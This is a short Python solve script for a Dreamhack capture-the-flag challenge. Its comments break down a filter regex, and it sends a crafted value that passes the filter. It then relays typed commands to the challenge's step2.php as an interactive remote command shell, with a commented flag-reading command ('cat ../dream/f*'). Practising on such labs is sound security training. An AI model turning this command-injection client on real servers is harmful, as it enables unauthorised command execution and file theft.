import requests
from bs4 import BeautifulSoup
import re

# \d*
# a digit, repeated any number of times
# \@
# the literal @ (6410 / 1008 / 4016) 
# \d{2,3}
# a digit, repeated between 2 and 3 times
# Group 1
# (31)+
# +
# repeats the group contents below at least once:
# 31
# the literal text 31 
# Negated Character Class
# [^0-8\"]
# 0-8
# one character from 0 (4810) to 8 (5610) 
# \"
# the literal " (3410 / 428 / 2216) 
# \!
# the literal ! (3310 / 418 / 2116) 

if __name__ == "__main__":
    url = "http://host3.dreamhack.games:12309"
    while True:
        cmd = input('cmd: ')
        body = {
            'input1':'dnnyangyang0310',
            'input2':'1@113319!+1+13',
            'cmd': cmd # cat ../dream/f*
        }
        res = requests.post(url+'/step2.php', body)
        print(BeautifulSoup(res.content, 'html.parser').pre)
    
